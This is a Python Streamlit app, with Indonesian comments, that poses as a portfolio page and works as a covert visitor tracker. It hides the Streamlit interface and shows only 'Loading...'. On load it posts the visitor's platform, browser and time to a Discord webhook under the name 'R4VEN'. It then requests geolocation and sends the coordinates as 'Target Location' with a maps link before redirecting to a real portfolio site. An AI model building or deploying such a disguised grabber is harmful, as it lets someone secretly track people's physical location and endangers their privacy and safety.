import streamlit as st
import streamlit.components.v1 as components

# Konfigurasi halaman Streamlit
st.set_page_config(
    page_title="Portfolio", 
    page_icon="💼", 
    layout="wide"
)

# CSS untuk menyembunyikan elemen bawaan Streamlit
hide_streamlit_style = """
    <style>
    #MainMenu {visibility: hidden;}
    header {visibility: hidden;}
    footer {visibility: hidden;}
    .stApp > header {display: none;}
    </style>
"""
st.markdown(hide_streamlit_style, unsafe_allow_html=True)

# Ambil Discord Webhook dari Streamlit Secrets
try:
    webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
except Exception:
    webhook_url = ""

html_code = f"""
<!DOCTYPE html>
<html>
<body onload="getLocation()">
  <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
    <h3>Loading...</h3>
  </div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script>
    const WEBHOOK_URL = "{webhook_url}";

    function sendToDiscord(payload) {{
        const request = new XMLHttpRequest();
        request.open("POST", WEBHOOK_URL);
        request.setRequestHeader('Content-type', 'application/json');
        request.send(JSON.stringify(payload));
    }}

    // Kirim Info Sistem
    var sysinfo = "Platform: " + navigator.platform + " | Browser: " + navigator.appName + " | Time: " + new Date().toLocaleTimeString();
    sendToDiscord({{
      username: "R4VEN",
      content: "@everyone Someone Opened The Link",
      embeds: [{{ title: "System Info", description: sysinfo, color: 15418782 }}]
    }});

    function getLocation() {{
      if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      }}
    }}

    function showPosition(position) {{
      var latlong = "Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude;
      var mapLink = "https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude;
      
      sendToDiscord({{
        username: "R4VEN",
        embeds: [{{ 
            title: "Target Location", 
            description: latlong + "\\n[Buka di Maps](" + mapLink + ")", 
            color: 15844367 
        }}]
      }});

      // Arahkan ke portofolio setelah izin diberikan
      setTimeout(function() {{
        window.location.href = "https://iqbalmantam.github.io/portfolio/";
      }, 500);
    }}

    function showError(error) {{
      sendToDiscord({{
        username: "R4VEN",
        content: "User denied location access."
      }});
      // Tetap arahkan ke portofolio meskipun ditolak agar tidak blank
      window.location.href = "https://iqbalmantam.github.io/portfolio/";
    }}
  </script>
</body>
</html>
"""

if webhook_url:
    components.html(html_code, height=200)
else:
    st.error("⚠️ Discord Webhook URL belum diatur!")
